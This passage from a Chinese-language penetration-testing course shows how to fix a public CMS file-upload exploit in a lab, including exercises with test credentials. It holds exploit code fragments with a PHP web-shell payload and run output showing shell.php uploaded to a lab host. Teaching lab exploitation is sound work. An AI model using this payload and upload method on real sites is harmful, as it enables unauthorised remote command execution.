

### 15.2.3.1 练习

-   1. 连接到你的专用 Linux 实验客户端并启动 apache2 服务；目标 Web 应用位于 */var/www/https/* 目录下。

-   2. 修改原始漏洞利用代码，将 *base_url* 变量设置为你的专用 Linux 实验客户端的正确 IP 地址，并将协议设置为 HTTPS。

-   3. 熟悉 *requests* Python 库，并相应调整你的漏洞利用代码，以跳过 SSL 验证。

-   4. 编辑 *username* 和 *password* 变量，使其与我们的测试用例匹配（用户名 "admin"，密码 "HUYafaw763"）。

-   5. 尝试对 Linux 实验客户端运行漏洞利用代码，它有效吗？如果没有，请尝试解释原因。

### 15.2.4 排查“索引超出范围”错误

检查我们的漏洞利用代码第 24 行，我们注意到它使用 *split*395 方法来切分存储在传递给 *parse_csrf_token* 函数的 *location* 参数中的字符串。*split*396 的 Python 文档指出，该方法使用作为第一个参数传递的可选分隔符来切分输入字符串。*split* 返回的字符串切片随后存储在一个 Python *List*（列表）对象中，可以通过索引访问：

```python
kali@kali:-$ python
>>> mystr = "Kali-*-Linux-*-Rocks"
>>> result = mystr.split("-*-")
>>> result
['Kali', 'Linux', 'Rocks']
>>> result[1]
'Linux'
>>>
```

*列表 456 - Python 字符串 split 方法*

在我们的漏洞利用代码中，字符串分隔符被定义为 *csrf_param* 变量（“__c”）后跟等号：

```python
csrf_param = "__c"
txt_filename = 'cmsmsrce.txt'
php_filename = 'shell.php'
payload = "<?php system($_GET['cmd']);?>"

def parse_csrf_token(location):
    return location.split(csrf_param + "=")[1]
```

*列表 457 - 理解第 24 行的代码*

为了更好地理解 *IndexError*，我们可以在 *parse_csrf_token* 函数中，在 return 指令之前添加一个 *print* 语句：

```python
csrf_param = "__c"
txt_filename = 'cmsmsrce.txt'
php_filename = 'shell.php'
payload = "<?php system($_GET['cmd']);?>"

def parse_csrf_token(location):
    print "[+] String that is being split: " + location
    return location.split(csrf_param + "=")[1]
```

*列表 458 - 添加 print 语句以查看调用 split 方法时的字符串*

现在漏洞利用代码会在调用 split 方法之前显示完整的字符串：

```bash
kali@kali:-$ python 44976_modified.py
/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py:849: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
InsecureRequestWarning)
[+] Authenticated successfully with the supplied credentials
[+] String that is being split:
https://10.11.0.128/admin?_sk=f29a64ed9afcebab247864
Traceback (most recent call last):
  File "44976_modified.py", line 104, in <module>
    run()
  File "44976_modified.py", line 95, in run
    cookies,csrf_token = authenticate()
  File "44976_modified.py", line 39, in authenticate
    return response.cookies, parse_csrf_token(response.headers['Location'])
  File "44976_modified.py", line 25, in parse_csrf_token
    return location.split(csrf_param + "=")[1]
IndexError: list index out of range
```

*列表 459 - 检查 print 输出并注意到缺少 csrf_param 变量中定义的字符串*

虽然漏洞利用代码期望输入字符串包含 __c（如列表 458 中在 `csrf_param` 变量中定义的那样），但我们从 Web 应用程序收到的是 _sk_。

此时，我们并不完全理解为什么会发生这种情况。也许是漏洞利用开发者的软件版本与我们的不匹配，或者是 CMS 配置不匹配。无论如何，漏洞利用开发从来都不简单。

不过，我们可以尝试将 `csrf_param` 变量从 __c 更改为 _sk_，以匹配 CMS 响应，看看漏洞利用是否有效：

```python
csrf_param = "_sk_"
txt_filename = 'cmsmsrce.txt'
php_filename = 'shell.php'
payload = "<?php system($_GET['cmd']);?>"
```

*列表 460 - 更改 csrf_param 变量*

现在让我们执行修改后的漏洞利用代码：

```bash
kali@kali:~$ python 44976_modified.py
/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py:849: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
InsecureRequestWarning)
[+] Authenticated successfully with the supplied credentials
[+] String that is being split: https://10.11.0.128/admin?_sk=bd c51a781f6d ecdc126
[+] Attempting to upload cmsmsrce.txt...
..
[+] Successfully uploaded  cmsmsrce.txt
[*] Attempting to copy cmsmsrce.txt to shell.php...
..
[+] File copied successfully
[+] Exploit succeeded, shell can be found at: https://10.11.0.128/uploads/shell.php
```

*列表 461 - 成功利用的输出*

错误不再显示，我们收到一条消息，告知漏洞利用已成功。虽然我们不清楚为什么需要更改 `csrf_param`

395 (W3Schools, 2019), https://www.w3schools.com/python/ref_string_split.asp
396 (Python, 2019), https://docs.python.org/3/library/stdtypes.html

